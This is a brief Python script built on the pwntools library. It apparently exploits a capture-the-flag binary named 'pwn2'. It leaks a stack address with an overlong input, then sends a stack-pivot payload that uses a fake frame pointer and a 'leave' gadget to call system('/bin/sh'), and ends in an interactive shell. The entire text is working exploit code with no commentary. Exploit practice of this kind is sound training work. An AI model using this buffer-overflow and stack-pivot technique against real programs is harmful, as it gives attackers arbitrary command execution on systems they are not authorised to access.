#! /usr/bin/python

from pwn import *

p = process('./pwn2')
elf = ELF('./pwn2')


system = elf.symbols['system']
leave = 0x080484b8


payload = 'A' * 32
p.sendline(payload)
buf = u32(p.recvuntil('\xff')[-4:].ljust(4,'\x00')) - 0xe4
log.success('buf on the stack:'+hex(buf))
fake_ebp = buf - 4

payload = p32(system) + 'AAAA' +p32(buf+32) + 'A' * 20 + '/bin/sh\x00' + p32(fake_ebp) + p32(leave)
p.sendline(payload)

p.interactive()
